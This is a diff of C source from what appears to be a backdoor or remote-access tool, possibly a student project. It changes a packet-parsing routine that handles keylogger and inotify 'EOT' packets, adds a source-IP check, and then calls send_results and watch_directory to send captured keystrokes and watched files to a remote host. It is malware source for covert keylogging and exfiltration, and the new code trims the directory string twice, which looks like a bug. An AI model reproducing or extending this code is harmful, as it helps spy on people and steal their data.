@@ -162,33 +162,43 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                         break;
                     case KEYLOGGER:
                         printf("EOT Keylogger packet\n");
-                        sleep(1);
-                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
+                        Filter->flag = COMMAND;
+                        src = ip->ip_src;
+                        printf("source: %d", ntohs(src.s_addr));
+                        if(src.s_addr == inet_addr(Filter->targetip)){
+                            sleep(1);
+                            send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
+                        }
                         break;
                     case INOTIFY:
                         printf("EOT Inotify packet\n");
 
-                        sleep(1);
+                        Filter->flag = COMMAND;
+                        src = ip->ip_src;
+                        printf("source: %d", ntohs(src.s_addr));
+                        if(src.s_addr == inet_addr(Filter->targetip)){
 
-                        if((fp = fopen(FILENAME, "rb+")) < 0){
-                            perror("fopen");
-                            exit(1);
+                            if((fp = fopen(FILENAME, "rb+")) < 0){
+                                perror("fopen");
+                                exit(1);
+                            }
+
+                            char *directory = NULL;
+                            char *file = NULL;
+                            size_t size;
+
+                            getline(&directory, &size, fp);
+                            getline(&file, &size, fp);
+                            directory[strlen(directory)-1] = '\0';
+
+                            directory[strlen(directory) -1] = '\0';
+
+                            printf("directory: %s\n", directory);
+                            printf("file: %s\n", file);
+
+                            //start inotify
+                            watch_directory(Filter->targetip, Filter->localip, directory, file, Filter->tcp);
                         }
-
-                        char *directory = NULL;
-                        char *file = NULL;
-                        size_t size;
-
-                        getline(&directory, &size, fp);
-                        getline(&file, &size, fp);
-
-                        directory[strlen(directory) -1] = '\0';
-
-                        printf("directory: %s\n", directory);
-                        printf("file: %s\n", file);
-
-                        //start inotify
-                        watch_directory(Filter->targetip, Filter->localip, directory, file, Filter->tcp);
                         break;
                 }
 
